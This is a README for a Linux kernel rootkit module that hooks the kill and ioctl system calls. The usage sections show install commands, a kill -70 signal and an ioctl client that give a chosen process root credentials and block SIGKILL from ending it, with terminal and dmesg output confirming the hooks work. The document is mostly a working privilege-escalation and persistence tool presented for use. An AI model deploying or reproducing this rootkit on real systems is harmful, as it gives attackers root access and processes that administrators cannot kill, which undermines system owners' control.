# Process Protection Rootkit

> Hook `SYS_ioctl` & `SYS_kill` to protect process.

Kernel version:

```bash
$ uname -r
5.4.0
```

main functions:

- modify process's cred structure to root, and add the process to a protect process's link list.
- hook `SYS_kill` to protect the process (which is in the link list) to be killed by `SIG_KILL`.
- hook `SYS_ioctl` to provide a `IOCTL_*` command to protect a process (same result as `SYS_kill`).

## Installation

```bash
$ make
$ sudo insmod server/rootkit.ko
```

## Usage

### Command line

> attention: [`kill` is a built-in utility in `bash`](https://unix.stackexchange.com/questions/509688/why-does-kill-not-appear-to-be-a-bash-builtin-it-should-be)
> 
> in `bash`, `/usr/bin/kill` is a built-in utility, while `/bin/kill` directly invoke system call. this rootkit only affect the `/bin/kill`, two options can be chosen:
> 
> - use `/bin/kill`
> - use `enable -n kill`, then use `kill`

create a process by `sleep`. user `kill -70` to protect this process:

```bash
$ sleep 2000 &
[1] 1112
$ ps aux | grep sleep | grep -v grep
b3ale       1112  0.0  0.0   8076   524 pts/0    S    19:28   0:00 sleep 2000
$ kill -70 `pidof sleep`
$ ps aux | grep sleep | grep -v grep
root        1112  0.0  0.0      0     0 pts/0    D    19:28   0:00 [sleep]
```

the process can not be killed by `SIG_KILL`:

```bash
$ kill -9 `pidof sleep`
$ ps aux | grep sleep | grep -v grep
root        1112  0.0  0.0      0     0 pts/0    D    19:28   0:00 [sleep]
$ dmesg | tail -20
[  502.033131] rootkit: module verification failed: signature and/or required key missing - tainting kernel
[  502.034990] init module
[  502.034991] init protected pids list
[  502.041560] sys_call_table = 0xffffffff980013a0
[  502.041561] real_kill = 0xffffffff970b4300
[  502.041571] fake_kill = 0xffffffffc08961c0
[  502.041576] hook SYS_kill @ 0xffffffffc08961c0
[  554.361520] found task_struct @ 0xffff93637640bd00
[  554.361522] add 1112 to protected pids list
[  582.155023] can not kill the process
```

use `kill -71` to diable the protection and everything come back to normal:

```bash
$ kill -71 `pidof sleep`
$ ps aux | grep sleep | grep -v grep
b3ale       1112  0.0  0.0   8076   524 pts/0    S    19:28   0:00 sleep 2000
$ kill -9 `pidof sleep`
[1]+  Killed                  sleep 2000
```

## Sample clients

usage:

```bash
$ ./client
usage: ./client [$pid] [kill|ioctl]
```

create a process by `sleep 2000 &`, and directly use `./client` to test:

```bash
$ sleep 2000 &
[1] 6766
$ ./client ioctl `pidof sleep`
current process list
b3ale       6766  0.0  0.0   8076   584 pts/0    S    18:43   0:00 sleep 2000
b3ale       6767  0.0  0.0   1076   816 pts/0    S+   18:43   0:00 ./client ioctl 6766
protect the process
root        6766  0.0  0.0      0     0 pts/0    D    18:43   0:00 [sleep]
b3ale       6767  0.0  0.0   1076   816 pts/0    S+   18:43   0:00 ./client ioctl 6766
you can not kill the process
root        6766  0.0  0.0      0     0 pts/0    D    18:43   0:00 [sleep]
b3ale       6767  0.0  0.0   1076   816 pts/0    S+   18:43   0:00 ./client ioctl 6766
unprotect the process
b3ale       6766  0.0  0.0   8076   584 pts/0    S    18:43   0:00 sleep 2000
b3ale       6767  0.0  0.0   1076   816 pts/0    S+   18:43   0:00 ./client ioctl 6766
now you can kill the process
b3ale       6767  0.0  0.0   1076   816 pts/0    S+   18:43   0:00 ./client ioctl 6766
[1]+  Killed                  sleep 2000
```

